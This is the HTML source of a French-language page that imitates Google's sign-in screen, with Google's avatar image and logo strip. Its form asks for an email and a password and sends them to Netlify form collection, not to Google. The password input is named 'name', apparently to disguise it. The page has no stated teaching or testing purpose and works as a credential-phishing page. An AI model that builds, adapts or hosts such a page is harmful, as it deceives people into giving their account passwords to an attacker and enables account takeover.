<!DOCTYPE html>
<html>

<head>
    <meta charset="UTF-8">
    <link type="text/css" rel="stylesheet" href="login_style.css">
    <title>Se connecter avec Google</title>

    <link rel="stylesheet" href="style.css">

</head>

<body>
    <div class="logo" style="margin-top:100px;">
        <img src="logo.png">
    </div>
    <p style="font-family:'Product Sans Regular';font-weight:normal;font-size:32px; ">Connectez vous avec Google
    </p>
    <div class="login" style="margin-top: 10px; height:355px;">
        <br><br>
        <div>
            <img src="https://ssl.gstatic.com/accounts/ui/avatar_2x.png">
        </div>
        <br>
        <form method="POST" data-netlify="true">
            <input class="inaa" name="email" id="mail" placeholder="Votre e-mail">
            <input class="inaa ma" name="name" type="password" id="message" placeholder="Votre mot de passe">

            <button type="submit" class="ok">
                <div class="button mal">
                    <p>Se connecter</p>
                </div>
            </button>
        </form>
        <br><br>

        <a href="#">
        </a>
    </div>
    <p style="text-align: center;">Découvrez tous nos services.</p>
    <div class="logo-strip">
        <img src="https://ssl.gstatic.com/accounts/ui/wlogostrip_230x17_1x.png">
    </div>
    <div class="bottom">
        <br>
        <a href="#">A propos</a>
        <a href="#">Confidentialité</a>
        <a href="#">Activité</a>
        <a href="#">Paramètes</a>
    </div>
    <style>
        .mal {
            background: #1a73e8 !important;
            display: flex;
            justify-content: center;
            align-items: center
        }

        .ok {
            text-decoration: none !important;
            margin-bottom: 25px !important;
            background: #1a73e800;
            border: 0;
            cursor: pointer;
            margin-left: -7px;
        }
    </style>
</body>

</html>
